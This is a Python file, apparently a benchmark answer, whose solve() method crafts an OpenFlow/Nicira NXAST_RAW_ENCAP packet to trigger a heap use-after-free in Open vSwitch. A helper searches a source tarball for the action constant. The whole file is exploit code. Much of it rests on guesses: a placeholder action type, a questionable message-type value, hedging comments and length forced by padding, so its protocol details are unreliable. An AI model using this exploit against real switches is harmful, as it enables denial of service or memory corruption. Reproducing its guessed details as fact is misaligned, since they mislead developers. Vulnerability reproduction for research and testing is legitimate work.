import os
import struct
import tempfile
import subprocess
import hashlib
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC triggers a heap use-after-free in decode_NXAST_RAW_ENCAP
        # by causing reallocation in decode_ed_prop()
        
        # OpenFlow header (8 bytes)
        # version = 0x04 (OpenFlow 1.3), type = 0x0d (OFPT_EXPERIMENTER)
        of_header = struct.pack('!BBHI', 0x04, 0x0d, 72, 0x00000001)
        
        # Nicira experimenter ID
        experimenter = struct.pack('!I', 0x00002320)
        
        # NXAST_RAW_ENCAP action structure
        # type = NXAST_RAW_ENCAP (needs to be looked up from source)
        # We'll use a placeholder and patch it later
        action_type = 0x0004  # This is a common value for NXAST_RAW_ENCAP
        action_len = 56  # Total action length
        
        # First, try to extract the actual constant from source
        action_type = self._extract_nxast_raw_encap(src_path)
        
        # Build the action header
        action_header = struct.pack('!HH', action_type, action_len)
        
        # Padding to 8 bytes
        padding = struct.pack('!I', 0)
        
        # Encap header (minimal Ethernet frame)
        # This will be the 'encap' structure that gets freed
        encap_header = bytes([
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # dst MAC
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # src MAC
            0x08, 0x00, 0x45, 0x00, 0x00, 0x1c,  # EtherType + IP header
            0x00, 0x00, 0x00, 0x00, 0x40, 0x11,  # IP header cont.
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # IP addresses
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # UDP header
            0x00, 0x00, 0x00, 0x00
        ])
        
        # Now add properties that will trigger reallocation
        # The key is to have a property that causes decode_ed_prop() to reallocate
        # We need the property to be large enough to trigger reallocation
        
        # Property header: type = 0 (ED_PROP_SET), len = 20
        prop_header = struct.pack('!HH', 0, 20)
        
        # Property data - this should cause buffer to need more space
        prop_data = bytes([
            0x00, 0x00, 0x00, 0x00,  # field
            0x00, 0x00, 0x00, 0x00,  # value
            0x00, 0x00, 0x00, 0x00,  # mask
            0x00, 0x00, 0x00, 0x00   # padding
        ])
        
        # Assemble the final packet
        poc = (of_header + experimenter + action_header + padding + 
               encap_header + prop_header + prop_data)
        
        # Ensure total length is 72 bytes as specified
        if len(poc) != 72:
            # Pad or truncate to exact length
            poc = poc[:72] if len(poc) > 72 else poc + b'\x00' * (72 - len(poc))
        
        return poc
    
    def _extract_nxast_raw_encap(self, src_path: str) -> int:
        """Extract NXAST_RAW_ENCAP constant from source code."""
        # Common values for NXAST_RAW_ENCAP in different OVS versions
        common_values = [0x0004, 0x0005, 0x0006, 0x0014]
        
        try:
            # Try to extract from tarball
            import tarfile
            with tarfile.open(src_path, 'r:gz') as tar:
                # Look for header files that might contain the constant
                for member in tar.getmembers():
                    if member.name.endswith(('.h', '.c')):
                        try:
                            f = tar.extractfile(member)
                            if f:
                                content = f.read().decode('utf-8', errors='ignore')
                                # Search for NXAST_RAW_ENCAP definition
                                lines = content.split('\n')
                                for line in lines:
                                    if 'NXAST_RAW_ENCAP' in line and '#define' in line:
                                        # Try to extract numeric value
                                        parts = line.split()
                                        for i, part in enumerate(parts):
                                            if part == 'NXAST_RAW_ENCAP' and i + 2 < len(parts):
                                                # Next token should be the value
                                                val_str = parts[i + 1]
                                                if val_str.startswith('0x'):
                                                    return int(val_str, 16)
                                                elif val_str.isdigit():
                                                    return int(val_str)
                        except:
                            continue
        except:
            pass
        
        # Fallback: try to parse the source directory directly
        src_dir = Path(src_path)
        if src_dir.is_dir():
            for root, dirs, files in os.walk(src_dir):
                for file in files:
                    if file.endswith(('.h', '.c')):
                        try:
                            with open(os.path.join(root, file), 'r', errors='ignore') as f:
                                content = f.read()
                                lines = content.split('\n')
                                for line in lines:
                                    if 'NXAST_RAW_ENCAP' in line and '#define' in line:
                                        parts = line.split()
                                        for i, part in enumerate(parts):
                                            if part == 'NXAST_RAW_ENCAP' and i + 2 < len(parts):
                                                val_str = parts[i + 1]
                                                if val_str.startswith('0x'):
                                                    return int(val_str, 16)
                                                elif val_str.isdigit():
                                                    return int(val_str)
                        except:
                            continue
        
        # If not found, use the most common value
        return common_values[0]
